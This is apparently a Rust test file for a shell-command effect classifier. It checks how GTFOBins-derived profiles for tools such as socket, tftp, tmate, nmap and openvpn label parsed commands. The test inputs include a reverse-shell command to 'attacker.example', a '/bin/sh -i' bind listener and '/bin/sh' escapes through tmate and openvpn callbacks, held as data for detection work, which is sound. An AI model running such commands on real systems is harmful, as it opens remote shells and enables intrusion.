//! GTFOBins 30f group B profiles. Commands are parsed as data and never run.
use caushell_parse::parse_command;
use caushell_profile::*;
use caushell_types::ShellKind;

const PROFILES: [(&str, &str); 10] = [
    ("lp", include_str!("../profiles/lp.yaml")),
    ("cancel", include_str!("../profiles/cancel.yaml")),
    ("telnet", include_str!("../profiles/telnet.yaml")),
    ("tftp", include_str!("../profiles/tftp.yaml")),
    ("socket", include_str!("../profiles/socket.yaml")),
    ("ltrace", include_str!("../profiles/ltrace.yaml")),
    ("tshark", include_str!("../profiles/tshark.yaml")),
    ("nmap", include_str!("../profiles/nmap.yaml")),
    ("tmate", include_str!("../profiles/tmate.yaml")),
    ("openvpn", include_str!("../profiles/openvpn.yaml")),
];

fn bind(source: &str, command: &str) -> BoundInvocation {
    let profile = load_command_profile_from_str(source)
        .unwrap_or_else(|error| panic!("profile load failed for {command}: {error}"));
    let parsed = parse_command(command, ShellKind::Bash).unwrap();
    let projected = project_invocation(&parsed.commands[0], InvocationRuntimeContext::new());
    let selected = select_invocation(&profile, &projected)
        .unwrap_or_else(|error| panic!("selection failed for {command}: {error}"));
    bind_invocation(&profile, &projected, &selected)
}

fn has_effect(bound: &BoundInvocation, kind: EffectKind) -> bool {
    bound.effects.iter().any(|effect| effect.kind == kind)
}

fn values<'a>(bound: &'a BoundInvocation, name: &str) -> Vec<&'a str> {
    bound
        .bound_parameters
        .iter()
        .filter(|parameter| parameter.name.as_str() == name)
        .flat_map(|parameter| &parameter.values)
        .map(|value| match value {
            BoundValue::Argument { text, .. } => text.as_str(),
            other => panic!("unexpected {name}: {other:?}"),
        })
        .collect()
}

#[test]
fn all_profiles_load_with_primary_research_and_known_limits() {
    for (name, source) in PROFILES {
        let profile =
            load_command_profile_from_str(source).unwrap_or_else(|error| panic!("{name}: {error}"));
        assert_eq!(profile.identity.canonical_name.as_str(), name);
        assert!(
            profile
                .extensions
                .contains_key("caushell.profile/source_research"),
            "{name}"
        );
        assert!(
            profile
                .extensions
                .contains_key("caushell.profile/known_limitations"),
            "{name}"
        );
    }
}

#[test]
fn cups_network_submission_and_job_control_do_not_claim_local_mutations() {
    let lp = bind(
        PROFILES[0].1,
        "lp /tmp/project/input-file -h printer.example:631",
    );
    assert_eq!(lp.form_id.as_str(), "submit_file_to_remote_printer");
    assert!(has_effect(&lp, EffectKind::ReadPath), "{lp:#?}");
    assert!(has_effect(&lp, EffectKind::NetworkEndpoint), "{lp:#?}");
    assert!(!has_effect(&lp, EffectKind::WritePath), "{lp:#?}");

    let cancel = bind(PROFILES[1].1, "cancel -h print.example:12345 -u DATA");
    assert_eq!(cancel.form_id.as_str(), "cancel_jobs_on_remote_server");
    assert!(
        has_effect(&cancel, EffectKind::NetworkEndpoint),
        "{cancel:#?}"
    );
    assert!(!has_effect(&cancel, EffectKind::WritePath), "{cancel:#?}");
    assert_eq!(values(&cancel, "owner"), ["DATA"]);
}

#[test]
fn telnet_and_tftp_keep_native_prompts_out_of_shell_argv() {
    let telnet = bind(PROFILES[2].1, "telnet");
    assert_eq!(telnet.form_id.as_str(), "open_telnet_command_mode");
    assert!(
        has_effect(&telnet, EffectKind::OpenInteractiveEscapeSurface),
        "{telnet:#?}"
    );
    assert!(
        has_effect(&telnet, EffectKind::ExecutePayload),
        "{telnet:#?}"
    );

    let tftp = bind(PROFILES[3].1, "tftp attacker.example");
    assert_eq!(tftp.form_id.as_str(), "open_tftp_transfer_prompt");
    assert!(
        has_effect(&tftp, EffectKind::OpenInteractiveEscapeSurface),
        "{tftp:#?}"
    );
    assert!(!has_effect(&tftp, EffectKind::NetworkEndpoint), "{tftp:#?}");
    assert!(!has_effect(&tftp, EffectKind::WritePath), "{tftp:#?}");
}

#[test]
fn socket_listener_and_reverse_connection_retain_native_payload() {
    let listener = bind(PROFILES[4].1, "socket -svp '/bin/sh -i' 12345");
    assert_eq!(
        listener.form_id.as_str(),
        "bind_listener_with_opaque_program"
    );
    assert!(
        has_effect(&listener, EffectKind::ListenNetwork),
        "{listener:#?}"
    );
    assert!(
        has_effect(&listener, EffectKind::ExecutePayload),
        "{listener:#?}"
    );

    let reverse = bind(
        PROFILES[4].1,
        "socket -qvp '/bin/sh -i' attacker.example 12345",
    );
    assert_eq!(
        reverse.form_id.as_str(),
        "connect_to_remote_host_with_opaque_program"
    );
    assert!(
        has_effect(&reverse, EffectKind::NetworkEndpoint),
        "{reverse:#?}"
    );
    assert!(
        has_effect(&reverse, EffectKind::ExecutePayload),
        "{reverse:#?}"
    );
}

#[test]
fn ltrace_reads_config_dispatches_children_and_keeps_attach_distinct() {
    let read = bind(PROFILES[5].1, "ltrace -F /tmp/project/input-file /dev/null");
    assert_eq!(read.form_id.as_str(), "trace_child_with_config");
    assert!(has_effect(&read, EffectKind::ReadPath), "{read:#?}");
    assert!(has_effect(&read, EffectKind::DispatchCommand), "{read:#?}");

    let write = bind(
        PROFILES[5].1,
        "ltrace -s 999 -o /tmp/project/trace.log ltrace -F DATA",
    );
    assert_eq!(write.form_id.as_str(), "trace_child");
    assert!(has_effect(&write, EffectKind::WritePath), "{write:#?}");
    assert!(
        has_effect(&write, EffectKind::DispatchCommand),
        "{write:#?}"
    );

    let attach = bind(PROFILES[5].1, "ltrace -p 4242");
    assert_eq!(attach.form_id.as_str(), "attach_to_existing_process");
    assert!(
        !has_effect(&attach, EffectKind::ControlProcess),
        "{attach:#?}"
    );
    assert!(
        !has_effect(&attach, EffectKind::DispatchCommand),
        "{attach:#?}"
    );
}

#[test]
fn lua_extensions_remain_opaque_and_nmap_source_paths_are_real() {
    let tshark = bind(
        PROFILES[6].1,
        "tshark -X lua_script:/tmp/project/plugin.lua",
    );
    assert_eq!(tshark.form_id.as_str(), "load_opaque_lua_script");
    assert!(
        has_effect(&tshark, EffectKind::ExecutePayload),
        "{tshark:#?}"
    );
    assert!(has_effect(&tshark, EffectKind::ReadPath), "{tshark:#?}");

    let read = bind(PROFILES[7].1, "nmap -iL /tmp/project/hosts.txt");
    assert_eq!(read.form_id.as_str(), "scan");
    assert!(has_effect(&read, EffectKind::ReadPath), "{read:#?}");

    let legacy_output = bind(PROFILES[7].1, "nmap -oG=/path/to/output-file 127.0.0.1");
    assert_eq!(legacy_output.form_id.as_str(), "scan");
    assert!(
        has_effect(&legacy_output, EffectKind::WritePath),
        "{legacy_output:#?}"
    );
    // Native tight spelling is legacy -o with the full suffix G=... .
    assert!(
        values(&legacy_output, "legacy_output")
            .iter()
            .any(|value| value.contains("G=/path/to/output-file")),
        "{legacy_output:#?}"
    );

    let script = bind(
        PROFILES[7].1,
        "nmap --script=/tmp/project/script.nse 127.0.0.1",
    );
    assert_eq!(script.form_id.as_str(), "execute_opaque_nse_script");
    assert!(
        has_effect(&script, EffectKind::ExecutePayload),
        "{script:#?}"
    );
}

#[test]
fn tmate_and_openvpn_callbacks_remain_opaque_recursive_execution() {
    let tmate = bind(PROFILES[8].1, "tmate -c '/bin/sh'");
    assert_eq!(tmate.form_id.as_str(), "execute_default_shell_command");
    assert!(has_effect(&tmate, EffectKind::ExecutePayload), "{tmate:#?}");

    let config = bind(PROFILES[9].1, "openvpn --config /tmp/project/client.conf");
    assert_eq!(config.form_id.as_str(), "read_config_file");
    assert!(has_effect(&config, EffectKind::ReadPath), "{config:#?}");

    let callback = bind(
        PROFILES[9].1,
        "openvpn --dev null --script-security 2 --up '/bin/sh -s'",
    );
    assert_eq!(callback.form_id.as_str(), "execute_opaque_up_callback");
    assert!(
        has_effect(&callback, EffectKind::ExecutePayload),
        "{callback:#?}"
    );
    assert!(
        !has_effect(&callback, EffectKind::DispatchCommand),
        "{callback:#?}"
    );
}
